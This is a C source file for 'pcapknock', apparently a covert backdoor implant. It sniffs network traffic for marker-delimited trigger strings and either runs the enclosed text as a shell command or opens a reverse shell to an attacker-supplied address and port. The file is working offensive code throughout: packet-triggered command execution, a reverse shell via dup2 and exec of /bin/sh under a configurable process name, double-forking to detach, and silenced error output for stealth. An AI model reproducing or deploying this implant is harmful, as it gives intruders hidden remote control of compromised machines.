/*
 * pcapknock.c
 * Watch for trigger packets, take action
 * By J. Stuart McMurray
 * Created 20180308
 * Last Modified 20180310
 */

#define _GNU_SOURCE /* Blarg */

#include <sys/socket.h>
#include <sys/types.h>
#include <sys/wait.h>

#include <assert.h>
#include <netdb.h>
#include <pthread.h>
#include <signal.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

/* Make error output only happen if the ERROUT is defined */
#ifdef ERROUT
#include <err.h>
#else 
#define err(n, ...) exit(n)
#define warn(...) ((void)0)
#define warnx(...) ((void)0)
#endif /* #ifdef ERROUT */

#include "pcapknock.h"

void *do_pcap(void *a);
void handle(u_char *buf, const struct pcap_pkthdr *hdr, const u_char *pkt);
int find_string(char *marker, u_char *buf, const u_char *pkt, bpf_u_int32 len);
void double_fork(u_char *s, int action);
void callback(u_char *addr);
int capture_on_device(char *dev);

/* Constants for double_fork */
#define DO_CALLBACK 1
#define DO_COMMAND  2

/* Make sure we have a device */
#ifndef DEVICE
#error DEVICE must be set to the capture interface
#endif /* #ifndef DEVICE */

/* pcapknock starts do_pcap in a thread */
int
pcapknock(void)
{
        pcap_if_t *alldevsp, *cur;
        char errbuf[PCAP_ERRBUF_SIZE+1];
        int worky; /* True if at least one device worked for capture */

        /* If we have a single named device, capture on it */
        if ('\0' != DEVICE[0])
                return capture_on_device(DEVICE);

        /* If we don't have a particular device, get a list of capturable
         * devices. */
        bzero(errbuf, sizeof(errbuf));
        if (0 != pcap_findalldevs(&alldevsp, errbuf)) {
                warnx("findalldevs: %s", errbuf);
                return 1;
        }

        /* Capture on the devices */
        worky = 0;
        for (cur = alldevsp; NULL != cur; cur = cur->next) {
                /* Ignore loopback */
                if (0 == strncmp(cur->name, "lo", 2))
                        continue;
                /* Start capturing on the device */
                worky &= capture_on_device(cur->name);
        }

        pcap_freealldevs(alldevsp);

        return worky;
}

/* capture_on_device tries to start a capture on the device named dev. */
int
capture_on_device(char *dev) {
        int ret;
        pthread_t tid;
        pthread_attr_t attr;
        pcap_t *p;
        char errbuf[PCAP_ERRBUF_SIZE+1];

        /* Start thread detached */
        if (-1 == pthread_attr_init(&attr)) {
                warn("pthread_attr_init");
                return 1;
        }
        if (-1 == pthread_attr_setdetachstate(&attr,
                                PTHREAD_CREATE_DETACHED)) {
                warn("pthread_attr_setdetachstate");
                return 2;
        }

        /* Open capture device */
        memset(errbuf, 0, sizeof(errbuf));
        if (NULL == (p = pcap_open_live(dev, 65535, 1, 10, errbuf))) {
                warnx("pcap_open_live: %s", errbuf);
                return 3;
        }

        /* Spawn a thread to do the real work */
        if (0 != (ret = pthread_create(&tid, &attr, do_pcap, (void *)p))) {
                warn("pthread_create");
                return ret;
        }

        return 0;
}

/* do_pcap sets up pcap and watches for trigger packets */
void *
do_pcap(void *a)
{
/* Make sure we have a maximum knock length */
#ifndef MAXKNOCK
#error MAXKNOCK must be set
#endif /* #ifndef MAXKNOCK */

        u_char buf[MAXKNOCK];
        pcap_t *p = (pcap_t *)a;

        /* Capture packets */
        memset(buf, 0, sizeof(buf));
        if (0 > pcap_loop(p, -1, handle, buf)) {
                warn("pcap_loop: %s", pcap_geterr(p));
        }

        return NULL;
}

/* handle looks through a packet for magic strings and takes action if it
 * finds them. */
void
handle(u_char *buf, const struct pcap_pkthdr *hdr, const u_char *pkt)
{
/* Make sure both the callback and command markers are set */
#ifndef CBMARKER
#error CBMARKER must be set
#endif /* #ifndef CBMARKER */
#ifndef CMDMARKER
#error CMDMARKER must be set
#endif /* #ifndef CMDMARKER */

        if (find_string(CBMARKER, buf, pkt, hdr->caplen))
                double_fork(buf, DO_CALLBACK);
        else if (find_string(CMDMARKER, buf, pkt, hdr->caplen))
                double_fork(buf, DO_COMMAND);
}

/* find_string searches pkt for a string surrounded by marker...marker.  If
 * there is one, it puts it in buf and return 1, otherwise 0 is returned.  The
 * length of pkt is given in len. */
int
find_string(char *marker, u_char *buf, const u_char *pkt, bpf_u_int32 len)
{
        /* Start and end of found string */
        u_char *start, *end;

        /* See if the marker's there */
        if (NULL == (start = memmem(pkt, len, marker, strlen(marker))))
                return 0; /* Not there */
        start += strlen(marker);

        /* See if we have an end marker */
        if (NULL == (end = memmem(start, len-(start-pkt), marker,
                                        strlen(marker))))
                return 0; /* Not there */

        /* Save buffer */
        if (MAXKNOCK-1 < end-start)
                return 0;
        memset(buf, 0, MAXKNOCK);
        memcpy(buf, start, end-start);

        return 1;
}

/* Double-fork disassociates from the parent process and either calls back to
 * s if action is DO_CALLBACK or runs it as a command if action is DO_COMMAND.
 */
void
double_fork(u_char *s, int action)
{
        pid_t pid;
        int i;

        /* First of two forks */
        switch (pid = fork()) {
                case 0: /* Child */
                        break;
                case -1: /* Error */
                        warn("fork");
                        return;
                default: /* Parent */
                        /* Wait on the child and we're done */
                        waitpid(pid, NULL, 0);
                        /* Go back to processing packets */
                        return;
        }

        /* In middle child */

        /* Disassociate from parent, ignore child death */
        if (-1 == setsid())
                err(6, "setsid");
        for (i = 0; i <= CLMAXFD; ++i)
                close(i);
        if (SIG_ERR == signal(SIGCHLD, SIG_IGN))
                err(7, "signal");

        /* Fork the real handler */
        switch (pid = fork()) {
                case 0: /* Child */
                        break;
                case -1: /* Error */
                        err(8, "fork");
                default: /* Parent */
                        /* Die, let the child do the work */
                        exit(0);
        }

        /* In the real handler now */
        assert(DO_CALLBACK == action || DO_COMMAND == action);
        switch (action) {
                case DO_CALLBACK:
                        callback(s);
                case DO_COMMAND:
                        if (-1 == execl("/bin/sh", "sh", "-c", s,
                                                (char *)NULL))
                                exit(9);
        }
        exit(0);
}

/* callback calls back to the addr:port in s and gives a shell */
void
callback(u_char *addr)
{
        struct addrinfo hints, *res, *res0;
        char *port;
        int i, ret, s;

        /* Find end of string, then backtrack to find the port */
        for (i = 0; '\0' != addr[i]; ++i);
        for (; ':' != addr[i] && 0 < i; --i);
        if (0 == i)
                return;
        addr[i] = '\0';
        port = (char *)&(addr[i+1]);

        /* Turn into connectable addresses */
        memset(&hints, 0, sizeof(hints));
        hints.ai_family = AF_UNSPEC;
        hints.ai_socktype = SOCK_STREAM;
        if (0 != (ret = getaddrinfo((char *)addr, port, &hints, &res0)))
                exit(ret);

        /* Try to connect to the addresses we got back, likely just one */
        s = -1;
        for (res = res0; NULL != res; res = res->ai_next) {
                /* Try to make a socket */
                if (-1 == (s = socket(res->ai_family, res->ai_socktype,
                                                res->ai_protocol)))
                        continue;
                /* Try to connect to the address */
                if (-1 == connect(s, res->ai_addr, res->ai_addrlen)) {
                        close(s);
                        s = -1;
                        continue;
                }
                /* Got a connection */
                break;
        }
        if (-1 == s)
                exit(10);
        freeaddrinfo(res0);

        /* Make socket our stdio */
        for (i = 0; i < 3; ++i)
                if (-1 == dup2(s, i))
                        exit(11);
        /* Close the socket if it's not stdio.  This shouldn't happen. */
        if (2 <= s)
                close(s);

        /* Exec a shell */
        if (-1 == execl("/bin/sh", SHELLNAME, (char *)NULL))
                exit(12);
}
